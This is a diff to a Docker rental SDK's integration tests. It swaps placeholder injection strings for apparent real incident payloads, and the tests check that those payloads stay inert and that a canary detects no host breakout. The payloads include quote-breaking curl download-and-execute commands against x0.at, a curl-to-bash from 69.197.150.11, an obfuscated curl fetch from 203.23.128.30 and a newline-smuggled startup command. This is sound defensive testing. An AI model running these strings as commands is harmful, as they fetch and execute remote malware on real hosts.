@@ -13,13 +13,24 @@ from services.rental_docker_sdk import (
     ContainerRunSpec,
     RentalDockerSdkClient,
     RentalDockerSdkClientFactory,
+    build_container_command_argv,
     build_remove_authorized_keys_exec_spec,
 )
 
 
 TARGET_IMAGE = "alpine:3.20"
-HOSTILE_ENV_VALUE = "value'; echo SHOULD_NOT_RUN; $(echo nope)"
-HOSTILE_PUBLIC_KEY = 'ssh-ed25519 AAAA user"; echo KEY_MARKER; $(echo nope)'
+INCIDENT_DOCKER_PASSWORD = (
+    "x' | curl -fsSL https://x0.at/mney -o /tmp/mney"
+    "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
+)
+INCIDENT_DOCKER_IMAGE_PAYLOAD = (
+    "|| curl -fsSL http://69.197.150.11:54321/update | bash ||:0.0.0"
+)
+INCIDENT_PUBLIC_KEY = (
+    "';  c'u'''''r\\l'''' -o /tmp/systemd 203.23.128.30:443/linux_wss;'"
+)
+STARTUP_BREAKOUT_COMMAND = "\n\nsh /tmp/Jtd7.sh"
+HOST_BREAKOUT_MARKER_PATH = "/tmp/jtd7_host_hit"
 
 
 requires_local_docker = pytest.mark.skipif(
@@ -40,6 +51,7 @@ requires_ssh_local_docker = pytest.mark.skipif(
 class LocalSshDockerEndpoint:
     executor_info: ExecutorSSHInfo
     private_key: str
+    executor_container_name: str
 
 
 @dataclass(frozen=True)
@@ -64,7 +76,7 @@ async def test_local_docker_sdk_rental_smoke(local_docker_api_client):
             client,
             inspector_api_client=local_docker_api_client,
             container_name=container_name,
-            stdin_marker="LOCAL_SDK_STDIN_MARKER",
+            stdin_marker=INCIDENT_DOCKER_PASSWORD,
         )
         assert result.env_value_preserved
         assert result.stdin_marker_echoed
@@ -99,7 +111,7 @@ async def test_local_docker_sdk_factory_over_ssh(
                 rental_client,
                 inspector_api_client=local_docker_api_client,
                 container_name=container_name,
-                stdin_marker="LOCAL_SSH_SDK_STDIN_MARKER",
+                stdin_marker=INCIDENT_DOCKER_PASSWORD,
             )
             assert result.env_value_preserved
             assert result.stdin_marker_echoed
@@ -112,16 +124,67 @@ async def test_local_docker_sdk_factory_over_ssh(
         _remove_container_if_present(local_docker_api_client, container_name)
 
 
+@requires_ssh_local_docker
+@pytest.mark.asyncio
+async def test_local_docker_sdk_startup_breakout_payload_stays_container_command(
+    local_docker_api_client,
+    local_docker_client,
+    local_ssh_docker_endpoint,
+):
+    factory = RentalDockerSdkClientFactory()
+    container_name = _container_name("lium-rental-sdk-startup-replay")
+    startup_argv = build_container_command_argv(STARTUP_BREAKOUT_COMMAND)
+    assert startup_argv == ("sh", "/tmp/Jtd7.sh")
+
+    # Canary for the old host-shell breakout shape. If the exact startup
+    # payload escapes onto the SSH executor side, this harmless marker appears.
+    _install_startup_breakout_canary(
+        local_docker_client,
+        local_ssh_docker_endpoint.executor_container_name,
+    )
+
+    try:
+        async with factory.connect(
+            executor_info=local_ssh_docker_endpoint.executor_info,
+            private_key=local_ssh_docker_endpoint.private_key,
+        ) as rental_client:
+            await rental_client.pull(image=TARGET_IMAGE)
+            await rental_client.run_container(
+                ContainerRunSpec(
+                    image=TARGET_IMAGE,
+                    name=container_name,
+                    command=startup_argv,
+                    restart_policy=None,
+                )
+            )
+
+        inspect = local_docker_api_client.inspect_container(container_name)
+        assert inspect["Config"]["Cmd"] == ["sh", "/tmp/Jtd7.sh"]
+        assert not _container_file_exists(
+            local_docker_client,
+            local_ssh_docker_endpoint.executor_container_name,
+            HOST_BREAKOUT_MARKER_PATH,
+        )
+    finally:
+        _remove_container_if_present(local_docker_api_client, container_name)
+        _remove_startup_breakout_canary(
+            local_docker_client,
+            local_ssh_docker_endpoint.executor_container_name,
+        )
+
+
 @pytest.fixture
 def local_docker_api_client():
     import docker
     from docker.utils import kwargs_from_env
 
-    api_client = docker.APIClient(timeout=60, **kwargs_from_env())
+    api_client = None
     try:
+        api_client = docker.APIClient(timeout=60, **kwargs_from_env())
         api_client.ping()
     except Exception as exc:
-        api_client.close()
+        if api_client is not None:
+            api_client.close()
         pytest.skip(f"local Docker daemon unavailable: {exc}")
 
     try:
@@ -178,6 +241,7 @@ def local_ssh_docker_endpoint(tmp_path, local_docker_client):
                 ssh_host_key=ssh_host_key,
             ),
             private_key=private_key,
+            executor_container_name=executor_name,
         )
     finally:
         if executor_container is not None:
@@ -206,13 +270,13 @@ async def _run_rental_lifecycle(
             image=TARGET_IMAGE,
             name=container_name,
             command=("sh", "-c", "trap : TERM INT; sleep infinity & wait"),
-            environment={"HOSTILE_ENV": HOSTILE_ENV_VALUE},
+            environment={"HOSTILE_ENV": INCIDENT_DOCKER_IMAGE_PAYLOAD},
             restart_policy=None,
         )
     )
 
     inspect = inspector_api_client.inspect_container(container_name)
-    env_value_preserved = f"HOSTILE_ENV={HOSTILE_ENV_VALUE}" in (
+    env_value_preserved = f"HOSTILE_ENV={INCIDENT_DOCKER_IMAGE_PAYLOAD}" in (
         inspect["Config"].get("Env") or []
     )
 
@@ -233,7 +297,7 @@ async def _run_rental_lifecycle(
                 "-c",
                 "mkdir -p /root/.ssh && cat >> /root/.ssh/authorized_keys",
             ),
-            stdin=f"{HOSTILE_PUBLIC_KEY}\n",
+            stdin=f"{INCIDENT_PUBLIC_KEY}\n",
         )
     )
     verify_key_added_result = await rental_client.exec_in_container(
@@ -242,7 +306,7 @@ async def _run_rental_lifecycle(
             argv=(
                 "sh",
                 "-c",
-                "grep -q KEY_MARKER /root/.ssh/authorized_keys",
+                "grep -qF '203.23.128.30:443/linux_wss' /root/.ssh/authorized_keys",
             ),
         )
     )
@@ -254,7 +318,7 @@ async def _run_rental_lifecycle(
     remove_key_result = await rental_client.exec_in_container(
         build_remove_authorized_keys_exec_spec(
             container_name=container_name,
-            public_keys=[HOSTILE_PUBLIC_KEY],
+            public_keys=[INCIDENT_PUBLIC_KEY],
         )
     )
     verify_key_removed_result = await rental_client.exec_in_container(
@@ -263,7 +327,10 @@ async def _run_rental_lifecycle(
             argv=(
                 "sh",
                 "-c",
-                "if grep -q KEY_MARKER /root/.ssh/authorized_keys; then exit 1; fi",
+                (
+                    "if grep -qF '203.23.128.30:443/linux_wss' "
+                    "/root/.ssh/authorized_keys; then exit 1; fi"
+                ),
             ),
         )
     )
@@ -363,6 +430,45 @@ def _start_ssh_executor_container(
             ),
         ],
     )
+
+
+def _install_startup_breakout_canary(docker_client, container_name: str) -> None:
+    exit_code, output = _exec_container_shell(
+        docker_client,
+        container_name,
+        (
+            "cat > /tmp/Jtd7.sh <<'EOF'\n"
+            "#!/bin/sh\n"
+            f"printf '%s\\n' host-breakout > {HOST_BREAKOUT_MARKER_PATH}\n"
+            "EOF\n"
+            "chmod +x /tmp/Jtd7.sh\n"
+            f"rm -f {HOST_BREAKOUT_MARKER_PATH}"
+        ),
+    )
+    assert exit_code == 0, output
+
+
+def _remove_startup_breakout_canary(docker_client, container_name: str) -> None:
+    _exec_container_shell(
+        docker_client,
+        container_name,
+        f"rm -f /tmp/Jtd7.sh {HOST_BREAKOUT_MARKER_PATH}",
+    )
+
+
+def _container_file_exists(docker_client, container_name: str, path: str) -> bool:
+    exit_code, _ = _exec_container_shell(
+        docker_client,
+        container_name,
+        f"test -e {path}",
+    )
+    return exit_code == 0
+
+
+def _exec_container_shell(docker_client, container_name: str, command: str):
+    container = docker_client.containers.get(container_name)
+    result = container.exec_run(["sh", "-c", command])
+    return result.exit_code, result.output.decode(errors="replace")
 
 
 def _executor_info(
